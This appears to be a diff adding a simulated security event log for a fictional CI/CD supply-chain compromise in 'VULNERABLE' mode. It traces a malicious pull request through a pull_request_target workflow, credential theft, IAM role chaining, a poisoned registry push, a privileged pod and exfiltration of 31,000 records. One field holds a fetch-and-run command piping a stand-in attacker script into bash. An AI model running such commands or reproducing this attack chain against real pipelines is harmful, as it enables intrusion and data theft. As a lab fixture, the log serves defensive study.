@@ -1,0 +1,16 @@
+{"ts": "2026-09-24T16:57:44Z", "event": "system.reset", "details": {"mode": "VULNERABLE"}}
+{"ts": "2026-09-24T16:57:44Z", "event": "github.workflow_run", "details": {"run_id": "run-101", "pr": 101, "author": "seq-fan-2026 (created 11 Nov, throwaway)", "repo": "helix-diagnostics/helix-seqtools", "event": "pull_request_target", "runs_before_review": true, "has_base_secrets": true, "attacker_code_executed": "curl https://evil.example/stage2.sh | bash", "oidc_sub": "repo:helix-diagnostics/helix-seqtools:pull_request", "ts": "2026-09-24T16:57:44Z"}}
+{"ts": "2026-09-24T16:57:44Z", "event": "iam.assume_HelixDeploy", "details": {"role": "HelixDeploy", "oidc_sub": "repo:helix-diagnostics/helix-seqtools:pull_request", "trust": "repo:helix-diagnostics/*", "allowed": true, "ts": "2026-09-24T16:57:44Z"}}
+{"ts": "2026-09-24T16:57:44Z", "event": "runner.exec", "details": {"executed_on": "self-hosted runner vm-2 (helix-build)", "cmd": "stage2: steal creds, prep registry push", "ts": "2026-09-24T16:57:44Z", "persisted": true, "warning": "/opt/runner-env/.x is OUTSIDE /work -> survives job cleanup, infects future legitimate builds (F8)"}}
+{"ts": "2026-09-24T16:57:44Z", "event": "iam.chain", "details": {"from": "HelixDeploy", "to": "HelixPipelineOps", "allowed": true, "ts": "2026-09-24T16:57:44Z"}}
+{"ts": "2026-09-24T16:57:44Z", "event": "registry.push", "details": {"tag": "stable", "digest": "sha256:evil9f224a", "pushed_by": "HelixPipelineOps (attacker-chained)", "ts": "2026-09-24T16:57:44Z"}}
+{"ts": "2026-09-24T16:57:44Z", "event": "k8s.list_secrets", "details": {"sa": "pipeline-runner", "allowed": true, "automount": true, "binding": true}}
+{"ts": "2026-09-24T16:57:44Z", "event": "k8s.create_pod", "details": {"name": "seq-pipeline-gpu-helper", "namespace": "pipeline", "sa": "pipeline-runner", "image": "sha256:evil9f224a", "privileged": true, "hostPath": "/", "ts": "2026-09-24T16:57:44Z"}}
+{"ts": "2026-09-24T16:57:44Z", "event": "soc.triage", "details": {"alert": "ALT-001", "verdict": "expected behaviour (privileged is normal)"}}
+{"ts": "2026-09-24T16:57:44Z", "event": "iam.chain", "details": {"from": "HelixPipelineOps", "to": "HelixDataExport", "allowed": true, "ts": "2026-09-24T16:57:44Z"}}
+{"ts": "2026-09-24T16:57:44Z", "event": "export.read", "details": {"by": "HelixDataExport", "count": 8000, "total": 8000}}
+{"ts": "2026-09-24T16:57:45Z", "event": "export.read", "details": {"by": "HelixDataExport", "count": 8000, "total": 16000}}
+{"ts": "2026-09-24T16:57:45Z", "event": "export.read", "details": {"by": "HelixDataExport", "count": 8000, "total": 24000}}
+{"ts": "2026-09-24T16:57:45Z", "event": "export.read", "details": {"by": "HelixDataExport", "count": 7000, "total": 31000}}
+{"ts": "2026-09-24T16:57:45Z", "event": "soc.triage", "details": {"alert": "ALT-002", "verdict": "consistent with month-end delivery batch"}}
+{"ts": "2026-09-24T16:57:45Z", "event": "export.deliver", "details": {"destination": "s3://attacker-drop/helix-cohort", "count": 31000, "by": "HelixDataExport", "ts": "2026-09-24T16:57:45Z"}}
